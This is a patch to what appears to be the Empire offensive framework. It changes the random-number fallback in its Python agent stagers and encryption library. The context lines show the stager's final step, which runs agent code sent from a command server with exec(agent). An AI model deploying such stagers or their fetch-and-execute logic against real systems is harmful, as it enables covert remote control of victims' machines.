@@ -1,0 +1,87 @@
+diff --git a/data/agent/stagers/dropbox.py b/data/agent/stagers/dropbox.py
+index cfb8831..6299e8e 100644
+--- a/data/agent/stagers/dropbox.py
++++ b/data/agent/stagers/dropbox.py
+@@ -52,14 +52,9 @@ for name, ID in ADDITIONAL.items(): ADDITIONAL_IDS[ID] = name
+ 
+ # If a secure random number generator is unavailable, exit with an error.
+ try:
+-    try:
+-        import ssl
+-        random_function = ssl.RAND_bytes
+-        random_provider = "Python SSL"
+-    except (AttributeError, ImportError):
+-        import OpenSSL
+-        random_function = OpenSSL.rand.bytes
+-        random_provider = "OpenSSL"
++    import ssl
++    random_function = ssl.RAND_bytes
++    random_provider = "Python SSL"
+ except:
+     random_function = os.urandom
+     random_provider = "os.urandom"
+@@ -892,4 +887,4 @@ response = post_message("https://api.dropboxapi.com/2/files/delete",data=datastr
+ 
+ # step 6 -> server sends HMAC(AES)
+ agent = aes_decrypt_and_verify(key, raw)
+-exec(agent)
+\ No newline at end of file
++exec(agent)
+diff --git a/data/agent/stagers/http.py b/data/agent/stagers/http.py
+index 0a06c5a..edc744d 100644
+--- a/data/agent/stagers/http.py
++++ b/data/agent/stagers/http.py
+@@ -53,14 +53,9 @@ for name, ID in ADDITIONAL.items(): ADDITIONAL_IDS[ID] = name
+ 
+ # If a secure random number generator is unavailable, exit with an error.
+ try:
+-    try:
+-        import ssl
+-        random_function = ssl.RAND_bytes
+-        random_provider = "Python SSL"
+-    except (AttributeError, ImportError):
+-        import OpenSSL
+-        random_function = OpenSSL.rand.bytes
+-        random_provider = "OpenSSL"
++    import ssl
++    random_function = ssl.RAND_bytes
++    random_provider = "Python SSL"
+ except:
+     random_function = os.urandom
+     random_provider = "os.urandom"
+diff --git a/lib/common/encryption.py b/lib/common/encryption.py
+index 6adfac8..9931ec2 100644
+--- a/lib/common/encryption.py
++++ b/lib/common/encryption.py
+@@ -22,6 +22,7 @@ Includes:
+ import base64
+ import hashlib
+ import hmac
++import os
+ import string
+ import M2Crypto
+ 
+@@ -57,11 +58,9 @@ try:
+     import ssl
+     random_function = ssl.RAND_bytes
+     random_provider = "Python SSL"
+-except (AttributeError, ImportError):
+-    import OpenSSL
+-    random_function = OpenSSL.rand.bytes
+-    random_provider = "OpenSSL"
+-
++except:
++    random_function = os.urandom
++    random_provider = "os.urandom"
+ 
+ def pad(data):
+     """
+@@ -285,7 +284,7 @@ class DiffieHellman(object):
+                 _rand = int.from_bytes(random_function(_bytes), byteorder='big')
+             except:
+                 # Python 2
+-                _rand = int(OpenSSL.rand.bytes(_bytes).encode('hex'), 16)
++                _rand = int(random_function(_bytes).encode('hex'), 16)
+ 
+         return _rand
+ 
